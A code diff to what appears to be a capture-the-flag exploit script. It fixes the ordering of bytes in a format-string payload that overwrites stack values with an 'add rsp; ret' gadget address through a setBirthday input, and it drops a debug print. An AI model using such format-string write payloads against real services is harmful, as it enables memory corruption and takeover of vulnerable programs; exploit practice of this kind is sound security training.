@@ -86,7 +86,6 @@ def setBirthday(birthday):
 def showInfo(norecv = False):
     sendln(b'4')
     if not norecv:
-        print("h")
         recvuntil(b'Username ')
         recvuntil(b'Bio: ')
         readln()
@@ -164,7 +163,7 @@ def main():
     
     # Format String payload
     payload = b'\0'
-    payload += '%{}x%61$hn%{}x%60$hn%{}x%59$hn'.format(ADD_RSP_RET_BYTES[0]-1, ADD_RSP_RET_BYTES[1]-ADD_RSP_RET_BYTES[0], ADD_RSP_RET_BYTES[2]-ADD_RSP_RET_BYTES[1]).encode()
+    payload += '%{}x%61$hn%{}x%60$hn%{}x%59$hn'.format(ADD_RSP_RET_BYTES_sorted[0]-1, ADD_RSP_RET_BYTES_sorted[1]-ADD_RSP_RET_BYTES_sorted[0], ADD_RSP_RET_BYTES_sorted[2]-ADD_RSP_RET_BYTES_sorted[1]).encode()
     
     setBirthday(payload)
 
